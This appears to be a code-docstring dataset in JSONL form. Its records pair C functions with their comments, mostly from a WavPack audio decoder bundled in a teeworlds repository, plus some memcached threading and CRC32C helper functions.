{"docstring": "// These two functions convert internal weights (which are normally +/-1024)\n// to and from an 8-bit signed character version for storage in metadata. The\n// weights are clipped here in the case that they are outside that range.\n", "func_signal": "int restore_weight (signed char weight)", "code": "{\n    int result;\n\n    if ((result = (int) weight << 3) > 0)\n        result += (result + 64) >> 7;\n\n    return result;\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read a single unsigned value from the specified bitstream with a value\n// from 0 to maxcode. If there are exactly a power of two number of possible\n// codes then this will read a fixed number of bits; otherwise it reads the\n// minimum number of bits and then determines whether another bit is needed\n// to define the code.\n", "func_signal": "static uint32_t read_code (Bitstream *bs, uint32_t maxcode)", "code": "{\n    int bitcount = count_bits (maxcode);\n    uint32_t extras = (1L << bitcount) - maxcode - 1, code;\n\n    if (!bitcount)\n        return 0;\n\n    getbits (&code, bitcount - 1, bs);\n    code &= (1L << (bitcount - 1)) - 1;\n\n    if (code >= extras) {\n        code = (code << 1) - extras;\n\n        if (getbit (bs))\n            ++code;\n    }\n\n    return code;\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read from current file position until a valid 32-byte WavPack 4.0 header is\n// found and read into the specified pointer. The number of bytes skipped is\n// returned. If no WavPack header is found within 1 meg, then a -1 is returned\n// to indicate the error. No additional bytes are read past the header and it\n// is returned in the processor's native endian mode. Seeking is not required.\n", "func_signal": "static uint32_t read_next_header (read_stream infile, WavpackHeader *wphdr)", "code": "{\n    char buffer [sizeof (*wphdr)], *sp = buffer + sizeof (*wphdr), *ep = sp;\n    uint32_t bytes_skipped = 0;\n    int bleft;\n\n    while (1) {\n        if (sp < ep) {\n            bleft = ep - sp;\n            memcpy (buffer, sp, bleft);\n        }\n        else\n            bleft = 0;\n\n        if (infile (buffer + bleft, sizeof (*wphdr) - bleft) != (int32_t) sizeof (*wphdr) - bleft)\n            return -1;\n\n        sp = buffer;\n\n        if (*sp++ == 'w' && *sp == 'v' && *++sp == 'p' && *++sp == 'k' &&\n            !(*++sp & 1) && sp [2] < 16 && !sp [3] && sp [5] == 4 &&\n            sp [4] >= (MIN_STREAM_VERS & 0xff) && sp [4] <= (MAX_STREAM_VERS & 0xff)) {\n                memcpy (wphdr, buffer, sizeof (*wphdr));\n                little_endian_to_native (wphdr, WavpackHeaderFormat);\n                return bytes_skipped;\n            }\n\n        while (sp < ep && *sp != 'w')\n            sp++;\n\n        if ((bytes_skipped += sp - buffer) > 1048576L)\n            return -1;\n    }\n}", "path": "src\\engine\\external\\wavpack\\wputils.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read configuration information from metadata.\n", "func_signal": "int read_config_info (WavpackContext *wpc, WavpackMetadata *wpmd)", "code": "{\n    int bytecnt = wpmd->byte_length;\n    uchar *byteptr = wpmd->data;\n\n    if (bytecnt >= 3) {\n        wpc->config.flags &= 0xff;\n        wpc->config.flags |= (int32_t) *byteptr++ << 8;\n        wpc->config.flags |= (int32_t) *byteptr++ << 16;\n        wpc->config.flags |= (int32_t) *byteptr << 24;\n    }\n\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read decorrelation weights from specified metadata block into the\n// decorr_passes array. The weights range +/-1024, but are rounded and\n// truncated to fit in signed chars for metadata storage. Weights are\n// separate for the two channels and are specified from the \"last\" term\n// (first during encode). Unspecified weights are set to zero.\n", "func_signal": "int read_decorr_weights (WavpackStream *wps, WavpackMetadata *wpmd)", "code": "{\n    int termcnt = wpmd->byte_length, tcount;\n    signed char *byteptr = wpmd->data;\n    struct decorr_pass *dpp;\n\n    if (!(wps->wphdr.flags & MONO_DATA))\n        termcnt /= 2;\n\n    if (termcnt > wps->num_terms)\n        return FALSE;\n\n    for (tcount = wps->num_terms, dpp = wps->decorr_passes; tcount--; dpp++)\n        dpp->weight_A = dpp->weight_B = 0;\n\n    while (--dpp >= wps->decorr_passes && termcnt--) {\n        dpp->weight_A = restore_weight (*byteptr++);\n\n        if (!(wps->wphdr.flags & MONO_DATA))\n            dpp->weight_B = restore_weight (*byteptr++);\n    }\n\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read the median log2 values from the specifed metadata structure, convert\n// them back to 32-bit unsigned values and store them. If length is not\n// exactly correct then we flag and return an error.\n", "func_signal": "int read_entropy_vars (WavpackStream *wps, WavpackMetadata *wpmd)", "code": "{\n    uchar *byteptr = wpmd->data;\n\n    if (wpmd->byte_length != ((wps->wphdr.flags & MONO_DATA) ? 6 : 12))\n        return FALSE;\n\n    wps->w.c [0].median [0] = exp2s (byteptr [0] + (byteptr [1] << 8));\n    wps->w.c [0].median [1] = exp2s (byteptr [2] + (byteptr [3] << 8));\n    wps->w.c [0].median [2] = exp2s (byteptr [4] + (byteptr [5] << 8));\n\n    if (!(wps->wphdr.flags & MONO_DATA)) {\n        wps->w.c [1].median [0] = exp2s (byteptr [6] + (byteptr [7] << 8));\n        wps->w.c [1].median [1] = exp2s (byteptr [8] + (byteptr [9] << 8));\n        wps->w.c [1].median [2] = exp2s (byteptr [10] + (byteptr [11] << 8));\n    }\n\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Get the current sample index position, or -1 if unknown\n", "func_signal": "uint32_t WavpackGetSampleIndex (WavpackContext *wpc)", "code": "{\n    if (wpc)\n        return wpc->stream.sample_index;\n\n    return (uint32_t) -1;\n}", "path": "src\\engine\\external\\wavpack\\wputils.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// This function returns the log2 for the specified 32-bit unsigned value.\n// The maximum value allowed is about 0xff800000 and returns 8447.\n", "func_signal": "static int mylog2 (uint32_t avalue)", "code": "{\n    int dbits;\n\n    if ((avalue += avalue >> 9) < (1 << 8)) {\n        dbits = nbits_table [avalue];\n        return (dbits << 8) + log2_table [(avalue << (9 - dbits)) & 0xff];\n    }\n    else {\n        if (avalue < (1L << 16))\n            dbits = nbits_table [avalue >> 8] + 8;\n        else if (avalue < (1L << 24))\n            dbits = nbits_table [avalue >> 16] + 16;\n        else\n            dbits = nbits_table [avalue >> 24] + 24;\n\n        return (dbits << 8) + log2_table [(avalue >> (dbits - 9)) & 0xff];\n    }\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read the next word from the bitstream \"wvbits\" and return the value. This\n// function can be used for hybrid or lossless streams, but since an\n// optimized version is available for lossless this function would normally\n// be used for hybrid only. If a hybrid lossless stream is being read then\n// the \"correction\" offset is written at the specified pointer. A return value\n// of WORD_EOF indicates that the end of the bitstream was reached (all 1s) or\n// some other error occurred.\n", "func_signal": "int32_t get_words (int32_t *buffer, int nsamples, uint32_t flags,\n                struct words_data *w, Bitstream *bs)", "code": "{\n    register struct entropy_data *c = w->c;\n    int csamples;\n\n    if (!(flags & MONO_DATA))\n        nsamples *= 2;\n\n    for (csamples = 0; csamples < nsamples; ++csamples) {\n        uint32_t ones_count, low, mid, high;\n\n        if (!(flags & MONO_DATA))\n            c = w->c + (csamples & 1);\n\n        if (!(w->c [0].median [0] & ~1) && !w->holding_zero && !w->holding_one && !(w->c [1].median [0] & ~1)) {\n            uint32_t mask;\n            int cbits;\n\n            if (w->zeros_acc) {\n                if (--w->zeros_acc) {\n                    c->slow_level -= (c->slow_level + SLO) >> SLS;\n                    *buffer++ = 0;\n                    continue;\n                }\n            }\n            else {\n                for (cbits = 0; cbits < 33 && getbit (bs); ++cbits);\n\n                if (cbits == 33)\n                    break;\n\n                if (cbits < 2)\n                    w->zeros_acc = cbits;\n                else {\n                    for (mask = 1, w->zeros_acc = 0; --cbits; mask <<= 1)\n                        if (getbit (bs))\n                            w->zeros_acc |= mask;\n\n                    w->zeros_acc |= mask;\n                }\n\n                if (w->zeros_acc) {\n                    c->slow_level -= (c->slow_level + SLO) >> SLS;\n                    CLEAR (w->c [0].median);\n                    CLEAR (w->c [1].median);\n                    *buffer++ = 0;\n                    continue;\n                }\n            }\n        }\n\n        if (w->holding_zero)\n            ones_count = w->holding_zero = 0;\n        else {\n            int next8;\n\n            if (bs->bc < 8) {\n                if (++(bs->ptr) == bs->end)\n                    bs->wrap (bs);\n\n                next8 = (bs->sr |= *(bs->ptr) << bs->bc) & 0xff;\n                bs->bc += 8;\n            }\n            else\n                next8 = bs->sr & 0xff;\n\n            if (next8 == 0xff) {\n                bs->bc -= 8;\n                bs->sr >>= 8;\n\n                for (ones_count = 8; ones_count < (LIMIT_ONES + 1) && getbit (bs); ++ones_count);\n\n                if (ones_count == (LIMIT_ONES + 1))\n                    break;\n\n                if (ones_count == LIMIT_ONES) {\n                    uint32_t mask;\n                    int cbits;\n\n                    for (cbits = 0; cbits < 33 && getbit (bs); ++cbits);\n\n                    if (cbits == 33)\n                        break;\n\n                    if (cbits < 2)\n                        ones_count = cbits;\n                    else {\n                        for (mask = 1, ones_count = 0; --cbits; mask <<= 1)\n                            if (getbit (bs))\n                                ones_count |= mask;\n\n                        ones_count |= mask;\n                    }\n\n                    ones_count += LIMIT_ONES;\n                }\n            }\n            else {\n                bs->bc -= (ones_count = ones_count_table [next8]) + 1;\n                bs->sr >>= ones_count + 1;\n            }\n\n            if (w->holding_one) {\n                w->holding_one = ones_count & 1;\n                ones_count = (ones_count >> 1) + 1;\n            }\n            else {\n                w->holding_one = ones_count & 1;\n                ones_count >>= 1;\n            }\n\n            w->holding_zero = ~w->holding_one & 1;\n        }\n\n        if ((flags & HYBRID_FLAG) && ((flags & MONO_DATA) || !(csamples & 1)))\n            update_error_limit (w, flags);\n\n        if (ones_count == 0) {\n            low = 0;\n            high = GET_MED (0) - 1;\n            DEC_MED0 ();\n        }\n        else {\n            low = GET_MED (0);\n            INC_MED0 ();\n\n            if (ones_count == 1) {\n                high = low + GET_MED (1) - 1;\n                DEC_MED1 ();\n            }\n            else {\n                low += GET_MED (1);\n                INC_MED1 ();\n\n                if (ones_count == 2) {\n                    high = low + GET_MED (2) - 1;\n                    DEC_MED2 ();\n                }\n                else {\n                    low += (ones_count - 2) * GET_MED (2);\n                    high = low + GET_MED (2) - 1;\n                    INC_MED2 ();\n                }\n            }\n        }\n\n        mid = (high + low + 1) >> 1;\n\n        if (!c->error_limit)\n            mid = read_code (bs, high - low) + low;\n        else while (high - low > c->error_limit) {\n            if (getbit (bs))\n                mid = (high + (low = mid) + 1) >> 1;\n            else\n                mid = ((high = mid - 1) + low + 1) >> 1;\n        }\n\n        *buffer++ = getbit (bs) ? ~mid : mid;\n\n        if (flags & HYBRID_BITRATE)\n            c->slow_level = c->slow_level - ((c->slow_level + SLO) >> SLS) + mylog2 (mid);\n    }\n\n    return (flags & MONO_DATA) ? csamples : (csamples / 2);\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read decorrelation samples from specified metadata block into the\n// decorr_passes array. The samples are signed 32-bit values, but are\n// converted to signed log2 values for storage in metadata. Values are\n// stored for both channels and are specified from the \"last\" term\n// (first during encode) with unspecified samples set to zero. The\n// number of samples stored varies with the actual term value, so\n// those must obviously come first in the metadata.\n", "func_signal": "int read_decorr_samples (WavpackStream *wps, WavpackMetadata *wpmd)", "code": "{\n    uchar *byteptr = wpmd->data;\n    uchar *endptr = byteptr + wpmd->byte_length;\n    struct decorr_pass *dpp;\n    int tcount;\n\n    for (tcount = wps->num_terms, dpp = wps->decorr_passes; tcount--; dpp++) {\n        CLEAR (dpp->samples_A);\n        CLEAR (dpp->samples_B);\n    }\n\n    if (wps->wphdr.version == 0x402 && (wps->wphdr.flags & HYBRID_FLAG)) {\n        byteptr += 2;\n\n        if (!(wps->wphdr.flags & MONO_DATA))\n            byteptr += 2;\n    }\n\n    while (dpp-- > wps->decorr_passes && byteptr < endptr)\n        if (dpp->term > MAX_TERM) {\n            dpp->samples_A [0] = exp2s ((short)(byteptr [0] + (byteptr [1] << 8)));\n            dpp->samples_A [1] = exp2s ((short)(byteptr [2] + (byteptr [3] << 8)));\n            byteptr += 4;\n\n            if (!(wps->wphdr.flags & MONO_DATA)) {\n                dpp->samples_B [0] = exp2s ((short)(byteptr [0] + (byteptr [1] << 8)));\n                dpp->samples_B [1] = exp2s ((short)(byteptr [2] + (byteptr [3] << 8)));\n                byteptr += 4;\n            }\n        }\n        else if (dpp->term < 0) {\n            dpp->samples_A [0] = exp2s ((short)(byteptr [0] + (byteptr [1] << 8)));\n            dpp->samples_B [0] = exp2s ((short)(byteptr [2] + (byteptr [3] << 8)));\n            byteptr += 4;\n        }\n        else {\n            int m = 0, cnt = dpp->term;\n\n            while (cnt--) {\n                dpp->samples_A [m] = exp2s ((short)(byteptr [0] + (byteptr [1] << 8)));\n                byteptr += 2;\n\n                if (!(wps->wphdr.flags & MONO_DATA)) {\n                    dpp->samples_B [m] = exp2s ((short)(byteptr [0] + (byteptr [1] << 8)));\n                    byteptr += 2;\n                }\n\n                m++;\n            }\n        }\n\n    return byteptr == endptr;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// This function returns the original integer represented by the supplied\n// logarithm (at least within the provided accuracy). The log is signed,\n// but since a full 32-bit value is returned this can be used for unsigned\n// conversions as well (i.e. the input range is -8192 to +8447).\n", "func_signal": "int32_t exp2s (int log)", "code": "{\n    uint32_t value;\n\n    if (log < 0)\n        return -exp2s (-log);\n\n    value = exp2_table [log & 0xff] | 0x100;\n\n    if ((log >>= 8) <= 9)\n        return value >> (9 - log);\n    else\n        return value << (log - 9);\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// This function is called during both encoding and decoding of hybrid data to\n// update the \"error_limit\" variable which determines the maximum sample error\n// allowed in the main bitstream. In the HYBRID_BITRATE mode (which is the only\n// currently implemented) this is calculated from the slow_level values and the\n// bitrate accumulators. Note that the bitrate accumulators can be changing.\n", "func_signal": "void update_error_limit (struct words_data *w, uint32_t flags)", "code": "{\n    int bitrate_0 = (w->bitrate_acc [0] += w->bitrate_delta [0]) >> 16;\n\n    if (flags & MONO_DATA) {\n        if (flags & HYBRID_BITRATE) {\n            int slow_log_0 = (w->c [0].slow_level + SLO) >> SLS;\n\n            if (slow_log_0 - bitrate_0 > -0x100)\n                w->c [0].error_limit = exp2s (slow_log_0 - bitrate_0 + 0x100);\n            else\n                w->c [0].error_limit = 0;\n        }\n        else\n            w->c [0].error_limit = exp2s (bitrate_0);\n    }\n    else {\n        int bitrate_1 = (w->bitrate_acc [1] += w->bitrate_delta [1]) >> 16;\n\n        if (flags & HYBRID_BITRATE) {\n            int slow_log_0 = (w->c [0].slow_level + SLO) >> SLS;\n            int slow_log_1 = (w->c [1].slow_level + SLO) >> SLS;\n\n            if (flags & HYBRID_BALANCE) {\n                int balance = (slow_log_1 - slow_log_0 + bitrate_1 + 1) >> 1;\n\n                if (balance > bitrate_0) {\n                    bitrate_1 = bitrate_0 * 2;\n                    bitrate_0 = 0;\n                }\n                else if (-balance > bitrate_0) {\n                    bitrate_0 = bitrate_0 * 2;\n                    bitrate_1 = 0;\n                }\n                else {\n                    bitrate_1 = bitrate_0 + balance;\n                    bitrate_0 = bitrate_0 - balance;\n                }\n            }\n\n            if (slow_log_0 - bitrate_0 > -0x100)\n                w->c [0].error_limit = exp2s (slow_log_0 - bitrate_0 + 0x100);\n            else\n                w->c [0].error_limit = 0;\n\n            if (slow_log_1 - bitrate_1 > -0x100)\n                w->c [1].error_limit = exp2s (slow_log_1 - bitrate_1 + 0x100);\n            else\n                w->c [1].error_limit = 0;\n        }\n        else {\n            w->c [0].error_limit = exp2s (bitrate_0);\n            w->c [1].error_limit = exp2s (bitrate_1);\n        }\n    }\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// This function checks the crc value(s) for an unpacked block, returning the\n// number of actual crc errors detected for the block. The block must be\n// completely unpacked before this test is valid. For losslessly unpacked\n// blocks of float or extended integer data the extended crc is also checked.\n// Note that WavPack's crc is not a CCITT approved polynomial algorithm, but\n// is a much simpler method that is virtually as robust for real world data.\n", "func_signal": "int check_crc_error (WavpackContext *wpc)", "code": "{\n    WavpackStream *wps = &wpc->stream;\n    int result = 0;\n\n    if (wps->crc != wps->wphdr.crc)\n        ++result;\n\n    return result;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read the hybrid related values from the specifed metadata structure, convert\n// them back to their internal formats and store them. The extended profile\n// stuff is not implemented yet, so return an error if we get more data than\n// we know what to do with.\n", "func_signal": "int read_hybrid_profile (WavpackStream *wps, WavpackMetadata *wpmd)", "code": "{\n    uchar *byteptr = wpmd->data;\n    uchar *endptr = byteptr + wpmd->byte_length;\n\n    if (wps->wphdr.flags & HYBRID_BITRATE) {\n        wps->w.c [0].slow_level = exp2s (byteptr [0] + (byteptr [1] << 8));\n        byteptr += 2;\n\n        if (!(wps->wphdr.flags & MONO_DATA)) {\n            wps->w.c [1].slow_level = exp2s (byteptr [0] + (byteptr [1] << 8));\n            byteptr += 2;\n        }\n    }\n\n    wps->w.bitrate_acc [0] = (int32_t)(byteptr [0] + (byteptr [1] << 8)) << 16;\n    byteptr += 2;\n\n    if (!(wps->wphdr.flags & MONO_DATA)) {\n        wps->w.bitrate_acc [1] = (int32_t)(byteptr [0] + (byteptr [1] << 8)) << 16;\n        byteptr += 2;\n    }\n\n    if (byteptr < endptr) {\n        wps->w.bitrate_delta [0] = exp2s ((short)(byteptr [0] + (byteptr [1] << 8)));\n        byteptr += 2;\n\n        if (!(wps->wphdr.flags & MONO_DATA)) {\n            wps->w.bitrate_delta [1] = exp2s ((short)(byteptr [0] + (byteptr [1] << 8)));\n            byteptr += 2;\n        }\n\n        if (byteptr < endptr)\n            return FALSE;\n    }\n    else\n        wps->w.bitrate_delta [0] = wps->w.bitrate_delta [1] = 0;\n\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\words.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// This is a helper function for unpack_samples() that applies several final\n// operations. First, if the data is 32-bit float data, then that conversion\n// is done in the float.c module (whether lossy or lossless) and we return.\n// Otherwise, if the extended integer data applies, then that operation is\n// executed first. If the unpacked data is lossy (and not corrected) then\n// it is clipped and shifted in a single operation. Otherwise, if it's\n// lossless then the last step is to apply the final shift (if any).\n", "func_signal": "static void fixup_samples (WavpackStream *wps, int32_t *buffer, uint32_t sample_count)", "code": "{\n    uint32_t flags = wps->wphdr.flags;\n    int shift = (flags & SHIFT_MASK) >> SHIFT_LSB;\n\n    if (flags & FLOAT_DATA) {\n        float_values (wps, buffer, (flags & MONO_FLAG) ? sample_count : sample_count * 2);\n        return;\n    }\n\n    if (flags & INT32_DATA) {\n        uint32_t count = (flags & MONO_FLAG) ? sample_count : sample_count * 2;\n        int sent_bits = wps->int32_sent_bits, zeros = wps->int32_zeros;\n        int ones = wps->int32_ones, dups = wps->int32_dups;\n        int32_t *dptr = buffer;\n\n        if (!(flags & HYBRID_FLAG) && !sent_bits && (zeros + ones + dups))\n            while (count--) {\n                if (zeros)\n                    *dptr <<= zeros;\n                else if (ones)\n                    *dptr = ((*dptr + 1) << ones) - 1;\n                else if (dups)\n                    *dptr = ((*dptr + (*dptr & 1)) << dups) - (*dptr & 1);\n\n                dptr++;\n            }\n        else\n            shift += zeros + sent_bits + ones + dups;\n    }\n\n    if (flags & HYBRID_FLAG) {\n        int32_t min_value, max_value, min_shifted, max_shifted;\n\n        switch (flags & BYTES_STORED) {\n            case 0:\n                min_shifted = (min_value = -128 >> shift) << shift;\n                max_shifted = (max_value = 127 >> shift) << shift;\n                break;\n\n            case 1:\n                min_shifted = (min_value = -32768 >> shift) << shift;\n                max_shifted = (max_value = 32767 >> shift) << shift;\n                break;\n\n            case 2:\n                min_shifted = (min_value = -8388608 >> shift) << shift;\n                max_shifted = (max_value = 8388607 >> shift) << shift;\n                break;\n\n            case 3:\n            default:\n                min_shifted = (min_value = (int32_t) 0x80000000 >> shift) << shift;\n                max_shifted = (max_value = (int32_t) 0x7FFFFFFF >> shift) << shift;\n                break;\n        }\n\n        if (!(flags & MONO_FLAG))\n            sample_count *= 2;\n\n        while (sample_count--) {\n            if (*buffer < min_value)\n                *buffer++ = min_shifted;\n            else if (*buffer > max_value)\n                *buffer++ = max_shifted;\n            else\n                *buffer++ <<= shift;\n        }\n    }\n    else if (shift) {\n        if (!(flags & MONO_FLAG))\n            sample_count *= 2;\n\n        while (sample_count--)\n            *buffer++ <<= shift;\n    }\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read multichannel information from metadata. The first byte is the total\n// number of channels and the following bytes represent the channel_mask\n// as described for Microsoft WAVEFORMATEX.\n", "func_signal": "int read_channel_info (WavpackContext *wpc, WavpackMetadata *wpmd)", "code": "{\n    int bytecnt = wpmd->byte_length, shift = 0;\n    char *byteptr = wpmd->data;\n    uint32_t mask = 0;\n\n    if (!bytecnt || bytecnt > 5)\n        return FALSE;\n\n    wpc->config.num_channels = *byteptr++;\n\n    while (--bytecnt) {\n        mask |= (uint32_t) *byteptr++ << shift;\n        shift += 8;\n    }\n\n    wpc->config.channel_mask = mask;\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// Read the int32 data from the specified metadata into the specified stream.\n// This data is used for integer data that has more than 24 bits of magnitude\n// or, in some cases, used to eliminate redundant bits from any audio stream.\n", "func_signal": "int read_int32_info (WavpackStream *wps, WavpackMetadata *wpmd)", "code": "{\n    int bytecnt = wpmd->byte_length;\n    char *byteptr = wpmd->data;\n\n    if (bytecnt != 4)\n        return FALSE;\n\n    wps->int32_sent_bits = *byteptr++;\n    wps->int32_zeros = *byteptr++;\n    wps->int32_ones = *byteptr++;\n    wps->int32_dups = *byteptr;\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// MODE_LOSSLESS:  file is lossless (pure lossless only)\n// MODE_HYBRID:  file is hybrid mode (lossy part only)\n// MODE_FLOAT:  audio data is 32-bit ieee floating point (but will provided\n//               in 24-bit integers for convenience)\n// MODE_HIGH:  file was created in \"high\" mode (information only)\n// MODE_FAST:  file was created in \"fast\" mode (information only)\n", "func_signal": "int WavpackGetMode (WavpackContext *wpc)", "code": "{\n    int mode = 0;\n\n    if (wpc) {\n        if (wpc->config.flags & CONFIG_HYBRID_FLAG)\n            mode |= MODE_HYBRID;\n        else if (!(wpc->config.flags & CONFIG_LOSSY_MODE))\n            mode |= MODE_LOSSLESS;\n\n        if (wpc->lossy_blocks)\n            mode &= ~MODE_LOSSLESS;\n\n        if (wpc->config.flags & CONFIG_FLOAT_DATA)\n            mode |= MODE_FLOAT;\n\n        if (wpc->config.flags & CONFIG_HIGH_FLAG)\n            mode |= MODE_HIGH;\n\n        if (wpc->config.flags & CONFIG_FAST_FLAG)\n            mode |= MODE_FAST;\n    }\n\n    return mode;\n}", "path": "src\\engine\\external\\wavpack\\wputils.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// This function initializes everything required to unpack a WavPack block\n// and must be called before unpack_samples() is called to obtain audio data.\n// It is assumed that the WavpackHeader has been read into the wps->wphdr\n// (in the current WavpackStream). This is where all the metadata blocks are\n// scanned up to the one containing the audio bitstream.\n", "func_signal": "int unpack_init (WavpackContext *wpc)", "code": "{\n    WavpackStream *wps = &wpc->stream;\n    WavpackMetadata wpmd;\n\n    if (wps->wphdr.block_samples && wps->wphdr.block_index != (uint32_t) -1)\n        wps->sample_index = wps->wphdr.block_index;\n\n    wps->mute_error = FALSE;\n    wps->crc = 0xffffffff;\n    CLEAR (wps->wvbits);\n    CLEAR (wps->decorr_passes);\n    CLEAR (wps->w);\n\n    while (read_metadata_buff (wpc, &wpmd)) {\n        if (!process_metadata (wpc, &wpmd)) {\n            strcpy (wpc->error_message, \"invalid metadata!\");\n            return FALSE;\n        }\n\n        if (wpmd.id == ID_WV_BITSTREAM)\n            break;\n    }\n\n    if (wps->wphdr.block_samples && !bs_is_open (&wps->wvbits)) {\n        strcpy (wpc->error_message, \"invalid WavPack file!\");\n        return FALSE;\n    }\n\n    if (wps->wphdr.block_samples) {\n        if ((wps->wphdr.flags & INT32_DATA) && wps->int32_sent_bits)\n            wpc->lossy_blocks = TRUE;\n\n        if ((wps->wphdr.flags & FLOAT_DATA) &&\n            wps->float_flags & (FLOAT_EXCEPTIONS | FLOAT_ZEROS_SENT | FLOAT_SHIFT_SENT | FLOAT_SHIFT_SAME))\n                wpc->lossy_blocks = TRUE;\n    }\n\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
{"docstring": "// MUST not be called with any deeper locks held\n// MUST be called only by parent thread\n// Note: listener thread is the \"main\" event base, which has exited its\n// loop in order to call this function.\n", "func_signal": "void stop_threads(void)", "code": "{\n    char buf[1];\n    int i;\n\n    // assoc can call pause_threads(), so we have to stop it first.\n    stop_assoc_maintenance_thread();\n    if (settings.verbose > 0)\n        fprintf(stderr, \"stopped assoc\\n\");\n\n    if (settings.verbose > 0)\n        fprintf(stderr, \"asking workers to stop\\n\");\n    buf[0] = 's';\n    pthread_mutex_lock(&init_lock);\n    init_count = 0;\n    for (i = 0; i < settings.num_threads; i++) {\n        if (write(threads[i].notify_send_fd, buf, 1) != 1) {\n            perror(\"Failed writing to notify pipe\");\n            /* TODO: This is a fatal problem. Can it ever happen temporarily? */\n        }\n    }\n    wait_for_thread_registration(settings.num_threads);\n    pthread_mutex_unlock(&init_lock);\n\n    if (settings.verbose > 0)\n        fprintf(stderr, \"asking background threads to stop\\n\");\n\n    // stop each side thread.\n    // TODO: Verify these all work if the threads are already stopped\n    stop_item_crawler_thread(CRAWLER_WAIT);\n    if (settings.verbose > 0)\n        fprintf(stderr, \"stopped lru crawler\\n\");\n    stop_lru_maintainer_thread();\n    if (settings.verbose > 0)\n        fprintf(stderr, \"stopped maintainer\\n\");\n    stop_slab_maintenance_thread();\n    if (settings.verbose > 0)\n        fprintf(stderr, \"stopped slab mover\\n\");\n    logger_stop();\n    if (settings.verbose > 0)\n        fprintf(stderr, \"stopped logger thread\\n\");\n    stop_conn_timeout_thread();\n    if (settings.verbose > 0)\n        fprintf(stderr, \"stopped idle timeout thread\\n\");\n\n    if (settings.verbose > 0)\n        fprintf(stderr, \"all background threads stopped\\n\");\n\n    // At this point, every background thread must be stopped.\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/*\n * Adds an item to a connection queue.\n */\n", "func_signal": "static void cq_push(CQ *cq, CQ_ITEM *item)", "code": "{\n    item->next = NULL;\n\n    pthread_mutex_lock(&cq->lock);\n    if (NULL == cq->tail)\n        cq->head = item;\n    else\n        cq->tail->next = item;\n    cq->tail = item;\n    pthread_mutex_unlock(&cq->lock);\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "// returns an item with the item lock held.\n// lock will still be held even if return is NULL, allowing caller to replace\n// an item atomically if desired.\n", "func_signal": "item *item_get_locked(const char *key, const size_t nkey, conn *c, const bool do_update, uint32_t *hv)", "code": "{\n    item *it;\n    *hv = hash(key, nkey);\n    item_lock(*hv);\n    it = do_item_get(key, nkey, *hv, c, do_update);\n    return it;\n}", "path": "memcached-sr\\thread.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
{"docstring": "/* Multiply a matrix times a vector over the Galois field of two elements,\n   GF(2).  Each element is a bit in an unsigned integer.  mat must have at\n   least as many entries as the power of two for most significant one bit in\n   vec. */\n", "func_signal": "static inline uint32_t gf2_matrix_times(uint32_t *mat, uint32_t vec)", "code": "{\n    uint32_t sum;\n\n    sum = 0;\n    while (vec) {\n        if (vec & 1)\n            sum ^= *mat;\n        vec >>= 1;\n        mat++;\n    }\n    return sum;\n}", "path": "memcached-sr\\crc32c.c", "repo_name": "Orange-OpenSource/bmc-cache", "stars": 394, "license": "lgpl-2.1", "language": "c", "size": 446}
